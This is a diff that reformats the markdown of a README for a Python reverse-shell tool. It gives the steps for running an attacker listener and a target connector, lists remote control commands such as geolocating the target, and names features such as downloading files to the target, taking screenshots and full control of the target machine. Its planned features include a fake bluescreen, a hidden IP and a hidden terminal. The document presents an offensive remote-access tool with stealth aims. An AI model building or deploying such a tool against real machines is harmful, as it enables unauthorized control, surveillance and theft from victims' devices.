@@ -1,14 +1,13 @@
-# Reverse Shell #
+# Reverse Shell
 
 Reverse shell implementation using Python.
-<br/><br/>
 
 <p align="center">
   <img src="./screenshot/reverse_shell_01.gif" with="600" height="339">
 </p>
 
+## Installation
 
-## Installation ##
 **NOTE**: Python 3.6 or higher is required.
 
 ```bash
@@ -24,21 +23,25 @@ $ cd reverse_shell
 $ pip3 install -r requirements.txt
 ```
 
-## Usage ##
-### 1. Listen for target ###
+## Usage
+
+### 1. Listen for target
+
 On attacker machine, run the `attacker.py` script.
+
 ```
 python3 attacker.py [port]
 ```
 
-### 2. Execute reverse shell ###
+### 2. Execute reverse shell
+
 On target machine, run the `target.py` script.
 ```
 python3 target.py [host] [port]
 ```
 
+## Commands
 
-## Commands ##
 ```sh
 # Halt
 !dc            Disconnect the target from this host, target will start reconnection process.
@@ -57,19 +60,20 @@ python3 target.py [host] [port]
 !geo_info      Get the geolocation on the target device.
 ```
 
+## Features
 
-## Features ##
-### Implemented ###
+### Implemented
+
 * Auto reconnection
 * Downloader (Download file to target machine)
 * Screenshot
 * Full control on the target machine.
 
-### Not Implemented ###
+### Not Implemented
+
 * Packet encoder/decoder.
 
-
-## TODOs ##
+## TODOs
 * Bluescreen (Fake)
 * Hidden IP
 * Hidden terminal
